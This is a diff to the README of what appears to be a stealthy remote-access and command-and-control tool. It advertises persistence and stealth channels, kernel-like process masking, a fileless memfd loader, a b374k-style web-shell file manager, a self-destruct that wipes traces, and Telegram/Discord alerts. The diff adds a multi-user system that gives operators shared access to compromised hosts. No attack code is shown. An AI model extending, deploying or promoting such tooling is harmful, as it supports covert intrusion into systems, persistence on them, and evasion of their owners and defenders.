@@ -23,10 +23,13 @@ The installer will:
 |---------|-------------|
 | **One-line Install** | Fully autonomous setup with random config |
 | **Multi-Channel** | STEALTH + PERSIST from same host |
+| **Multi-User System** | Role-based access with per-user deploy paths |
 | **End-to-end Encryption** | NaCl SecretBox (XSalsa20-Poly1305) |
 | **Key-based Auth** | Secure web UI access |
 | **Interactive PTY** | Full terminal via xterm.js |
 | **Process Masking** | Kernel-like process names |
+| **File Manager** | b374k-style with exec-based operations |
+| **Database Manager** | Adminer integration |
 | **Webhook Alerts** | Telegram & Discord notifications |
 
 ## Security Model
@@ -108,6 +111,24 @@ Each channel has independent:
 | `self_destruct` | Kill processes, wipe files, exit |
 | `ping_all` | Check all agents from cache |
 
+## Multi-User System
+
+| Feature | Description |
+|---------|-------------|
+| **Role-based Access** | Admin has full access, operators see only shared hosts |
+| **Per-user Deploy Paths** | Each user gets unique stealth/persist endpoints |
+| **Per-user Ports** | Random ports (5000-9000) for each operator |
+| **Host Sharing** | Admin can grant/revoke access to specific hosts |
+| **Browser Tabs UI** | Switch between users with tab interface |
+| **User Management** | Create, rename, delete users via modal |
+
+### User Types
+
+| Role | Capabilities |
+|------|--------------|
+| **Admin** | Full access to all hosts, user management |
+| **Operator** | View shared hosts only, execute commands |
+
 ## Files
 
 ```
@@ -118,6 +139,7 @@ Each channel has independent:
 ├── webhooks.py            # Telegram/Discord notifications
 ├── memfd_loader.py        # Python fileless loader
 ├── install.sh             # Autonomous VPS installer
+├── users.json             # User database (auto-created)
 ├── bin/
 │   ├── agent_linux_amd64  # Go agent x86_64
 │   └── agent_linux_arm64  # Go agent ARM64
